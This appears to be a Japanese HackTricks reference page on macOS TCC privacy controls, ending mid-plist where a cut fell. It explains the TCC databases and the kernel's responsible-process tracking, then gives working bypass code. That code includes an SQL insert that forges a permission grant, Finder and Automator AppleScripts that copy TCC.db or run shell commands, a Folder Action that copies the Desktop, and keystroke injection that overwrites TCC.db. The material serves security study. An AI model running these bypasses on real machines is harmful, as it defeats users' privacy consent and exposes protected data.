# macOS TCC

{{#include ../../../../banners/hacktricks-training.md}}

## **基本情報**

**TCC (Transparency, Consent, and Control)** は、アプリケーションの権限を管理するセキュリティプロトコルです。主な役割は、**位置情報サービス、連絡先、写真、マイク、カメラ、アクセシビリティ、フルディスクアクセス**などの機密機能を保護することです。これらの機能へのアプリのアクセスを許可する前に、ユーザーの明示的な同意を必須とすることで、TCCはプライバシーとユーザーによるデータ管理を強化します。

アプリケーションが保護された機能へのアクセスを要求すると、ユーザーはTCCを目にします。アクセスを**許可または拒否**できるプロンプトが表示されます。さらにTCCは、**ファイルをアプリケーションにドラッグ＆ドロップする**といったユーザーの直接的な操作による、特定ファイルへのアクセス許可にも対応しています。これにより、アプリケーションは明示的に許可されたものだけにアクセスできます。

![TCCプロンプトの例](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC** は、`/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` にある **daemon** が処理し、`/System/Library/LaunchDaemons/com.apple.tccd.system.plist` で設定されています（mach service `com.apple.tccd.system` を登録）。

ログイン中のユーザーごとに、`/System/Library/LaunchAgents/com.apple.tccd.plist` で定義された **ユーザーモードの tccd** が実行され、mach service `com.apple.tccd` と `com.apple.usernotifications.delegate.com.apple.tccd` を登録します。

以下に、system と user として実行されている tccd を示します。

```bash
ps -ef | grep tcc
    0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
  501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```

アクセス許可は**親**アプリケーションから**継承**され、**アクセス許可**は**Bundle ID**と**Developer ID**に基づいて**追跡**されます。

### TCCデータベース

許可／拒否の設定は、以下のTCCデータベースに保存されます。

- システム全体のデータベース **`/Library/Application Support/com.apple.TCC/TCC.db`** 。
  - このデータベースは**SIPで保護**されているため、書き込むにはSIP bypassが必要です。
- ユーザーごとの設定を保存するユーザーTCCデータベース **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** 。
  - このデータベースは保護されているため、Full Disk Accessなど、高いTCC権限を持つプロセスのみが書き込めます（ただし、SIPでは保護されていません）。

> [!WARNING]
> 前述のデータベースは、読み取りアクセスも**TCCで保護**されています。そのため、TCC権限を持つプロセスからでない限り、通常のユーザーTCCデータベースを**読み取ることはできません**。
>
> ただし、**FDA**や**`kTCCServiceEndpointSecurityClient`**などの高い権限を持つプロセスは、ユーザーTCCデータベースに書き込めることに注意してください。

- **3つ目**のTCCデータベースは**`/var/db/locationd/clients.plist`**にあり、**位置情報サービスへのアクセス**を許可されたクライアントを示します。
- **`/Library/Application Support/com.apple.TCC/REG.db`**には、登録済みのTCCデータベースのパスが記録されます。配置したユーザーデータベースは、登録されていないと拒否される場合があります。このパスを知っているだけでは、どちらのデータベースにもアクセスできません。<sup>[[6]](#references)</sup>
- **`/Library/Application Support/com.apple.TCC/MDMOverrides.plist`**には、管理対象のPrivacy Preferences Policy Control (PPPC)による判定が格納されています。管理対象アプリに付与された許可が通常の`access`行にない場合は、このファイルを確認してください。<sup>[[7]](#references)</sup>
- SIPで保護されているファイル**`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`**（ただし、誰でも読み取り可能）は、TCCの例外を必要とするアプリケーションの許可リストです。

> [!TIP]
> **iOS**のTCCデータベースは**`/private/var/mobile/Library/TCC/TCC.db`**にあります。

> [!TIP]
> **通知センターUI**から、**システムTCCデータベースを変更**できる場合があります。
>
> ```bash
> codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/> Support/tccd
> [..]
> com.apple.private.tcc.manager
> com.apple.rootless.storage.TCC
> ```
> ただし、ユーザーはコマンドラインユーティリティ **`tccutil`** を使って**ルールをリセット**できます。このユーティリティには、文書化されたクエリ操作はありません。<sup>[[4]](#references)</sup>

#### データベースを照会する

{{#tabs}}
{{#tab name="user DB"}}

```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```

{{#endtab}}

{{#tab name="system DB"}}

```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```

{{#endtab}}
{{#endtabs}}

> [!TIP]
> 両方のデータベースを確認すると、アプリに許可されている権限、拒否されている権限、またはまだ要求されていない権限を確認できます（アプリから要求されます）。

- **`service`** は TCC の **permission** を表す文字列です
- **`client`** は、権限が設定されている **bundle ID** または **バイナリへのパス** です
- **`client_type`** は、Bundle Identifier(0) か絶対パス(1) かを示します

<details>

<summary>絶対パスの場合の実行方法</summary>

**`launctl load you_bin.plist`** を実行します。以下のような plist を使います。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <!-- Label for the job -->
    <key>Label</key>
    <string>com.example.yourbinary</string>

    <!-- The path to the executable -->
    <key>Program</key>
    <string>/path/to/binary</string>

    <!-- Arguments to pass to the executable (if any) -->
    <key>ProgramArguments</key>
    <array>
        <string>arg1</string>
        <string>arg2</string>
    </array>

    <!-- Run at load -->
    <key>RunAtLoad</key>
    <true/>

    <!-- Keep the job alive, restart if necessary -->
    <key>KeepAlive</key>
    <true/>

    <!-- Standard output and error paths (optional) -->
    <key>StandardOutPath</key>
    <string>/tmp/YourBinary.stdout</string>
    <key>StandardErrorPath</key>
    <string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```

</details>

- **`auth_value`** は異なる値を取ります: denied(0)、unknown(1)、allowed(2)、または limited(3)。
- **`auth_reason`** は次の値を取ります: Error(1)、User Consent(2)、User Set(3)、System Set(4)、Service Policy(5)、MDM Policy(6)、Override Policy(7)、Missing usage string(8)、Prompt Timeout(9)、Preflight Unknown(10)、Entitled(11)、App Type Policy(12)
- **csreq** フィールドは、実行するバイナリを検証し、TCC permissions を付与する方法を示します:

```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```

- テーブルの**他のフィールド**について詳しくは、[**こちらのブログ記事を確認してください**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)。<sup>[[1]](#references)</sup>

`System Preferences --> Security & Privacy --> Privacy --> Files and Folders` で、アプリに**すでに付与されている権限**を確認することもできます。

> [!TIP]
> ユーザーは **`tccutil`** を使ってルールを**リセット**できますが、許可を照会するにはデータベースを調べる必要があります。<sup>[[4]](#references)</sup>

#### TCC権限をリセットする

```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```

#### Apple Events の送信元とターゲットの許可を特定する

Automation grant は、すべてのアプリを制御する許可ではなく、**送信元からターゲットへの**許可判断です。ユーザーデータベースにアクセスできる場合は、下記の [Apple Events](macos-apple-events.md) または Finder のワークフローを試す前に、許可された送信元とターゲットの組み合わせを列挙してください。`csreq` は送信元を識別し、`indirect_object_code_identity` はターゲットを識別します。null でないどちらかの blob は、上記の `csreq` メソッドでデコードしてください。<sup>[[1]](#references)</sup>

```bash
sqlite3 "$HOME/Library/Application Support/com.apple.TCC/TCC.db" \
  "SELECT client, indirect_object_identifier AS target, \
          hex(csreq) AS sender_req, \
          hex(indirect_object_code_identity) AS target_req \
   FROM access WHERE service='kTCCServiceAppleEvents' AND auth_value=2;"
```

### TCC署名チェック

TCC **データベース**にはアプリケーションの **Bundle ID** が保存されますが、権限の使用を要求しているアプリが正しいものであることを**確認する**ため、署名に関する**情報**も**保存**されています。

```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```

> [!WARNING]
> したがって、同じ名前とバンドル ID を使用する他のアプリケーションは、他のアプリに付与された権限にアクセスできません。

### Entitlements と TCC Permissions

TCC の許可は **App Sandbox** の制限を上書きしません。サンドボックス化されたカメラクライアントには `com.apple.security.device.camera` が必要です。Apple は Hardened Runtime アプリにもこの capability を提供しています。どちらの entitlement も、別途表示されるユーザー同意のプロンプトを回避するものではありません。サンドボックス entitlement が、サンドボックス化されていないすべてのプロセスに必須だと考えないでください。リクエストが失敗した場合は、実行ファイルの entitlements と responsible app の両方を確認してください。<sup>[[8]](#references)[[9]](#references)</sup>

entitlements は plist ファイルであり、コード署名の一部です。コード署名内では特別なスロットでさらにハッシュ化されており、カーネルコードからカーネルに問い合わせるか、`csops(#169)` または `csops_audittoken(#170)` を使用するユーザーモードコードから問い合わせることができます。

ただし、アプリが `~/Desktop`、`~/Downloads`、`~/Documents` などの**特定のユーザーフォルダにアクセス**する場合、特定の **entitlements は不要です。** システムがアクセスを透過的に処理し、必要に応じて**ユーザーにプロンプトを表示**します。

- [https://newosxbook.com/ent.php](https://newosxbook.com/ent.php)

Apple のアプリでは**プロンプトは表示されません。** **entitlements** リストに**事前に許可された権限**が含まれているため、**ポップアップは表示されず**、**TCC データベースにも登録されません。** 例：

```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
    <string>kTCCServiceReminders</string>
    <string>kTCCServiceCalendar</string>
    <string>kTCCServiceAddressBook</string>
</array>
```

これにより、Calendar がユーザーにリマインダー、カレンダー、アドレスブックへのアクセスを求めるのを防げます。

> [!TIP]
> entitlements に関する公式ドキュメントのほかに、[**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl) で entitlements に関する非公式の**興味深い情報**も確認できます。

TCC permissions には、kTCCServiceAppleEvents、kTCCServiceCalendar、kTCCServicePhotos などがあります。すべてを定義した公開リストはありませんが、[**既知のもののリスト**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service)を確認できます。<sup>[[1]](#references)</sup>

### 保護されていない機密性の高い場所

- $HOME（それ自体）
- $HOME/.ssh、$HOME/.aws など
- /tmp

### User Intent / com.apple.macl

前述のとおり、**ファイルをアプリにドラッグ\&ドロップすると、そのアプリにファイルへのアクセスを許可できます**。このアクセスは、どの TCC データベースにも記録されず、ファイルの**拡張属性**として保存されます。この属性には、許可されたアプリの UUID が**保存されます**。<sup>[[2]](#references)</sup>

```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
    uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```

> [!TIP]
> **`com.apple.macl`** 属性は tccd ではなく **Sandbox** によって管理されている点は興味深いところです。
>
> また、コンピューター上のアプリの UUID を許可するファイルを別のコンピューターに移動しても、同じアプリでも UUID が異なるため、そのアプリにアクセス権は付与されません。

拡張属性 `com.apple.macl` は、他の拡張属性のように**クリアできません**。**SIP によって保護されている**ためです。しかし、[**この投稿で説明されているように**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)、ファイルを**zip 圧縮**し、**削除**してから**解凍**することで無効化できます。<sup>[[3]](#references)</sup>






## XNU Responsible Process Mechanism

macOS/iOS では、**responsible process** メカニズムは、**TCC (Transparency, Consent, and Control)** フレームワークやその他のセキュリティシステムが、子プロセスの連鎖を経由した場合でも、あるアクションに最終的な責任を持つプロセスを追跡するために使用する重要なセキュリティ機能です。

TCC が権限（カメラ、マイク、位置情報など）を確認する際、リクエストを行ったプロセスそのものを常に確認するとは限りません。代わりに **responsible process** を確認します。通常は、実際のリクエストがヘルパープロセスやデーモンから行われた場合でも、そのアクションを開始した GUI アプリケーションが対象になります。

リクエストに実際に紐付けられたアプリを特定するには、保護対象の操作を実行しながら、TCC の `AttributionChain` メッセージをストリーミングしてください。API 呼び出しを行ったという理由だけでヘルパー実行ファイルに権限を付与するより、こちらのほうが確実です。報告された ID を、該当する `access` 行にある bundle ID またはパス、および署名要件と照合してください。<sup>[[10]](#references)</sup>

```bash
log stream --debug --predicate 'subsystem == "com.apple.TCC" AND eventMessage BEGINSWITH "AttributionChain"'
```

<details>
<summary>責任プロセスの設定方法</summary>

### プロセス構造体のフィールド

XNUの各プロセスは、2つの重要なUUID識別子を保持しています。

```c
// From bsd/sys/proc_internal.h
struct proc {
    // ...
    pid_t   p_responsible_pid;          // PID of the responsible process
    uint8_t p_uuid[16];                 // UUID from LC_UUID load command (self)
    uint8_t p_responsible_uuid[16];     // UUID of pid responsible for this process
    // ...
};
```

- **`p_uuid`**: プロセス自身のUUID（Mach-Oバイナリの`LC_UUID`ロードコマンドから取得）
- **`p_responsible_pid`**: 責任プロセスのPID
- **`p_responsible_uuid`**: 責任プロセスのUUID（そのプロセスが終了した後も保持される）

### 責任プロセスの設定方法

1. **プロセス作成時（Fork）**

`fork()`または`posix_spawn()`で新しいプロセスが作成されると、責任プロセスは親プロセスから継承されます（`exec()`システムコールは既存の`proc`構造体を再利用するため、この処理は再度行われません）。

**場所**: `bsd/kern/kern_fork.c:1053`

```c
// In fork1_internal() - called during all process creation
proc_set_responsible_pid(child_proc, parent_proc->p_responsible_pid);
```

**要点:**
- 子プロセスは親の `p_responsible_pid` を**継承**する
- これにより、プロセス階層を通じた**責任の連鎖**が形成される
- 責任プロセスは通常、元の GUI アプリケーションを指す

2. **コア関数: `proc_set_responsible_pid()`**

**場所**: `bsd/kern/kern_proc.c:4817-4831`

```c
void
proc_set_responsible_pid(proc_t target_proc, pid_t responsible_pid)
{
    target_proc->p_responsible_pid = responsible_pid;
    
    if (responsible_pid >= 0) {
        proc_t responsible_proc = proc_find(responsible_pid);
        if (responsible_proc != PROC_NULL) {
            // Copy the responsible process's UUID for persistent identification
            proc_getexecutableuuid(responsible_proc, 
                target_proc->p_responsible_uuid, 
                sizeof(target_proc->p_responsible_uuid));
            proc_rele(responsible_proc);
        }
    }
    return;
}
```

**この関数の処理内容:**
1. 対象プロセスに**responsible PIDを設定**
2. `proc_find()`を使って**responsible processを検索**（参照カウントを増加）
3. responsible processの`p_uuid`から対象プロセスの`p_responsible_uuid`にUUIDをコピー
4. `proc_rele()`で参照を**解放**（参照カウントを減少）

3. **PIDとUUIDの両方を保存する理由**

この二重保存方式は、重要な問題を解決します。

| フィールド | 目的 | 問題 | 解決策 |
|-------|-------|----------|----------|
| `p_responsible_pid` | 現在のプロセスをすばやく検索 | プロセス終了後にPIDが再利用される可能性がある | アクティブなプロセスの検索に使用 |
| `p_responsible_uuid` | 永続的な識別 | プロセス終了後も保持される | セキュリティチェックと監査に使用 |

**問題**: 子プロセスより先にresponsible processが終了すると、PIDが再利用され、まったく別のプロセスに割り当てられる可能性があります。

**解決策**: UUIDは不変であり、responsible processが終了した後も、その原因となった特定のバイナリを一意に識別します。

### プロセス作成フロー

```
┌─────────────────────────────────────────────────────────────┐
│ Parent Process (e.g., Safari)                               │
│ p_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81              │
│ p_responsible_pid: 1234 (points to itself)                 │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
└─────────────────────┬───────────────────────────────────────┘
                      │
                      │ fork() / posix_spawn()
                      ▼
         ┌────────────────────────────┐
         │ kern_fork.c:fork1_internal │
         │                            │
         │ proc_set_responsible_pid(  │
         │   child_proc,              │
         │   parent->p_responsible_pid│
         │ );                         │
         └────────────┬───────────────┘
                      │
                      ▼
         ┌────────────────────────────┐
         │ proc_set_responsible_pid() │
         │                            │
         │ 1. Set p_responsible_pid   │
         │ 2. Find responsible proc   │
         │ 3. Copy UUID               │
         │ 4. Release reference       │
         └────────────┬───────────────┘
                      │
                      ▼
┌─────────────────────────────────────────────────────────────┐
│ Child Process (e.g., SafariHelper)                          │
│ p_uuid: B266C9DD-8E3F-4AAA-9F1E-71D2E3CDEF82              │
│ p_responsible_pid: 1234 (inherited from parent)            │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
│                     (copied from Safari)                    │
└─────────────────────────────────────────────────────────────┘
```

### UUIDのソース: LC_UUID Load Command

`p_uuid` に格納されるUUIDは、**Mach-O実行ファイルの`LC_UUID` load command**に由来します。

1. **コンパイル時**

```bash
# When linking, the linker (ld) generates a unique UUID
$ ld -o myapp myapp.o
# Embedded in the Mach-O binary as LC_UUID load command
```

2. **実行時間**

**場所**: `bsd/kern/mach_loader.c:2393-2413`

```c
static load_return_t
load_uuid(struct uuid_command *uulp, char *command_end, load_result_t *result)
{
    if ((uulp->cmdsize < sizeof(struct uuid_command)) ||
        (((char *)uulp + sizeof(struct uuid_command)) > command_end)) {
        return LOAD_BADMACHO;
    }

    // Extract UUID from LC_UUID load command
    memcpy(&result->uuid[0], &uulp->uuid[0], sizeof(result->uuid));
    return LOAD_SUCCESS;
}
```

3. **プロセス構造体に保存**

**Location**: `bsd/kern/kern_exec.c:2281`

```c
// After loading the Mach-O binary during exec()
proc_setexecutableuuid(p, &load_result.uuid[0]);
```

**場所**: `bsd/kern/kern_proc.c:1912-1915`

```c
void
proc_setexecutableuuid(proc_t p, const unsigned char *uuid)
{
    memcpy(p->p_uuid, uuid, sizeof(p->p_uuid));
}
```
</details>


## TCC Privesc & Bypasses

### TCCへの挿入

TCC databaseへの書き込みアクセスを取得できた場合、以下のような方法でエントリを追加できます（コメントを削除してください）。

<details>

<summary>TCCへの挿入の例</summary>

```sql
INSERT INTO access (
    service,
    client,
    client_type,
    auth_value,
    auth_reason,
    auth_version,
    csreq,
    policy_id,
    indirect_object_identifier_type,
    indirect_object_identifier,
    indirect_object_code_identity,
    flags,
    last_modified,
    pid,
    pid_version,
    boot_uuid,
    last_reminded
) VALUES (
    'kTCCServiceSystemPolicyDesktopFolder', -- service
    'com.googlecode.iterm2', -- client
    0, -- client_type (0 - bundle id)
    2, -- auth_value  (2 - allowed)
    3, -- auth_reason (3 - "User Set")
    1, -- auth_version (always 1)
    X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
    NULL, -- policy_id
    NULL, -- indirect_object_identifier_type
    'UNUSED', -- indirect_object_identifier - default value
    NULL, -- indirect_object_code_identity
    0, -- flags
    strftime('%s', 'now'), -- last_modified with default current timestamp
    NULL, -- assuming pid is an integer and optional
    NULL, -- assuming pid_version is an integer and optional
    'UNUSED', -- default value for boot_uuid
    strftime('%s', 'now') -- last_reminded with default current timestamp
);
```

</details>

### TCC Payloads

TCC permissionsを持つアプリ内に侵入できた場合は、悪用できるTCC payloadsについて以下のページを確認してください:


{{#ref}}
macos-tcc-payloads.md
{{#endref}}

### Apple Events

Apple Eventsについては以下を参照してください:


{{#ref}}
macos-apple-events.md
{{#endref}}

### Automation (Finder) から FDA\*

Automation権限のTCC名は **`kTCCServiceAppleEvents`** です。\
このTCC権限は、TCC database内で**管理可能なアプリケーション**も指定します（そのため、権限があれば何でも管理できるわけではありません）。

**Finder**は（UIに表示されていなくても）**常にFDAを持つ**アプリケーションです。そのため、Finderに対する**Automation**権限があれば、その権限を悪用して**Finderに何らかの操作を実行させる**ことができます。\
この場合、アプリには **`com.apple.Finder`** に対する **`kTCCServiceAppleEvents`** 権限が必要です。<sup>[[4]](#references)</sup>

{{#tabs}}
{{#tab name="Steal users TCC.db"}}

```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
    set homeFolder to path to home folder as string
    set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
    set targetFolder to POSIX file "/tmp" as alias
    duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```

{{#endtab}}

{{#tab name="Steal systems TCC.db"}}

```applescript
osascript<<EOD
tell application "Finder"
    set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
    set targetFolder to POSIX file "/tmp" as alias
    duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```

{{#endtab}}
{{#endtabs}}

報告されている書き込み手法の一つは、Finder への Automation 経路が利用できる場合に、Finder にユーザーの `com.apple.TCC` ディレクトリを**リネームさせる**方法です。リネーム後のパスにあるデータベースをステージングディレクトリにコピーして変更し、元の場所にコピーし直して、ディレクトリ名を元に戻します。新しい `kTCCServiceAppleEvents` 行では、送信側バイナリと Finder の**両方**を、コード要件も含めて特定する必要があります。送信側だけに権限を付与しても、対象の ID を指定したことにはなりません。この手法はパスに依存するため、Finder Automation だけで任意のデータベース書き込みが可能だと決めつけず、対象の macOS リリースで検証してください。<sup>[[11]](#references)</sup>

> [!WARNING]
> この権限があれば、**Finder に TCC で制限されたフォルダへアクセスさせてファイルを渡すよう依頼できます**が、私の知る限り、**Finder に任意のコードを実行させて、その FDA アクセスを完全に悪用することはできません**。
>
> したがって、FDA の機能をすべて悪用できるわけではありません。

これは Finder に対する Automation 権限を得るための TCC プロンプトです。

<figure><img src="../../../../images/image (27).png" alt="" width="244"><figcaption></figcaption></figure>

> [!CAUTION]
> **Automator** アプリには TCC 権限 **`kTCCServiceAppleEvents`** があるため、Finder のような**任意のアプリを制御できます**。したがって、Automator を制御する権限があれば、以下のようなコードで **Finder** も制御できます。

<details>

<summary>Automator 内で shell を取得する</summary>

```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
   set actionID to Automator action id "com.apple.RunShellScript"
   tell (make new workflow)
      add actionID to it
      tell last Automator action
         set value of setting "inputMethod" to 1
         set value of setting "COMMAND_STRING" to theScript
      end tell
      execute it
   end tell
   activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```

</details>

**Script Editor app でも同じことが起こります。Finder を制御できますが、AppleScript を使ってスクリプトを実行させることはできません。**

### 一部の TCC に対する Automation（SE）

**System Events は Folder Actions を作成でき、Folder Actions は一部の TCC フォルダ（Desktop、Documents、Downloads）にアクセスできます**。そのため、次のようなスクリプトを使ってこの動作を悪用できます。

```bash
# Create script to execute with the action
cat > "/tmp/script.js" <<EOD
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("cp -r $HOME/Desktop /tmp/desktop");
EOD

osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"

# Create folder action with System Events in "$HOME/Desktop"
osascript <<EOD
tell application "System Events"
    -- Ensure Folder Actions are enabled
    set folder actions enabled to true

    -- Define the path to the folder and the script
    set homeFolder to path to home folder as text
    set folderPath to homeFolder & "Desktop"
    set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"

    -- Create or get the Folder Action for the Desktop
    if not (exists folder action folderPath) then
        make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
    end if
    set myFolderAction to folder action folderPath

    -- Attach the script to the Folder Action
    if not (exists script scriptPath of myFolderAction) then
        make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
    end if

    -- Enable the Folder Action and the script
    enable myFolderAction
end tell
EOD

# File operations in the folder should trigger the Folder Action
touch "$HOME/Desktop/file"
rm "$HOME/Desktop/file"
```

### Automation (SE) + Accessibility (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**)** による FDA\*

**`System Events`** に対する Automation + Accessibility（**`kTCCServicePostEvent`**）を使うと、**プロセスにキーストロークを送信**できます。これにより、Finderを悪用してユーザーのTCC.dbを変更したり、任意のアプリにFDAを付与したりできます（ただし、パスワードの入力を求められる場合があります）。

FinderでユーザーのTCC.dbを上書きする例：

```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
    -- Open Finder
    tell application "Finder" to activate

    -- Open the /tmp directory
    keystroke "g" using {command down, shift down}
    delay 1
    keystroke "/tmp"
    delay 1
    keystroke return
    delay 1

    -- Select and copy the file
    keystroke "TCC.db"
    delay 1
    keystroke "c" using {command down}
    delay 1

    -- Resolve $HOME environment variable
    set homePath to system attribute "HOME"

    -- Navigate to the Desktop directory under $HOME
    keystroke "g" using {command down, shift down}
    delay 1
    keystroke homePath & "/Library/Application Support/com.apple.TCC"
    delay 1
    keystroke return
    delay 1

    -- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
    keystroke "TCC.db"
    delay 1
    keystroke return
    delay 1
    key code 51 using {command down}
    delay 1

    -- Paste the file
    keystroke "v" using {command down}
end tell
EOF
```

### `kTCCServiceAccessibility` から FDA\*

このページで、FDA\* への privesc や、たとえば keylogger の実行に悪用できる[**Accessibility 権限を悪用する payloads**](macos-tcc-payloads.md#accessibility)を確認してください。

### **Endpoint Security Client から FDA**

**`kTCCServiceEndpointSecurityClient`** があれば、FDA を取得できます。以上です。

### System Policy SysAdmin File から FDA

**`kTCCServiceSystemPolicySysAdminFiles`** があれば、ユーザーの **`NFSHomeDirectory`** 属性を**変更**できます。これによりホームフォルダを変更できるため、**TCC をバイパス**できます。<sup>[[5]](#references)</sup>

### User TCC DB から FDA

**user TCC** データベースへの**書き込み権限**を取得しても、自分に **`FDA`** 権限を付与することはできません。それを付与できるのは、system database にあるデータベースだけです。

ただし、自分に **`Finder への Automation 権限`**を付与し、前述の手法を悪用して FDA\* へ権限昇格できます。

### **FDA から TCC 権限**

**Full Disk Access** の TCC 名は **`kTCCServiceSystemPolicyAllFiles`** です。

これは実際の privesc ではないと思いますが、役立つ場合に備えて説明します。FDA を持つプログラムを制御できる場合、ユーザーの TCC データベースを**変更し、自分に任意のアクセス権を付与**できます。FDA 権限を失う可能性がある場合に、これは persistence technique として役立ちます。

### **SIP Bypass から TCC Bypass**

system **TCC database** は **SIP** によって保護されています。そのため、**指定された entitlement を持つプロセスだけが変更できます**。したがって、攻撃者が**ファイル**に対する **SIP bypass**（SIP によって制限されたファイルを変更できること）を見つけた場合、次のことが可能になります。

- TCC database の**保護を解除**し、自分にすべての TCC 権限を付与する。たとえば、次のファイルを悪用できます。
  - TCC systems database
  - REG.db
  - MDMOverrides.plist

ただし、この **SIP bypass を悪用して TCC をバイパス**する方法はほかにもあります。`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` は、TCC の例外を必要とするアプリケーションの allow list です。したがって、攻撃者がこのファイルの **SIP 保護を解除**して、**自身のアプリケーション**を追加できれば、そのアプリケーションは TCC をバイパスできます。\
たとえば、terminal を追加するには、

```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```

AllowApplicationsList.plist:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>Services</key>
	<dict>
		<key>SystemPolicyAllFiles</key>
		<array>
			<dict>
